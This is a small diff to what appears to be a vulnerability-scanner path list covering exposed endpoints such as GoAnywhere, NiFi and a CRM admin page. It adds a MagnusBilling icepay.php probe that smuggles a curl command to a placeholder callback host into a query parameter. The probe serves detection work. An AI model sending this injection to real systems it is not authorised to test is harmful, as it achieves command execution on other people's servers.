@@ -54,3 +54,4 @@
 /goanywhere/images/..;/wizard/InitialAccountSetup.xhtml
 /nifi-api/process-groups/root
 /scrm/crm/admin
+/mbilling/lib/icepay/icepay.php?democ={{randstr}};curl%20{{interactsh-url}};%23
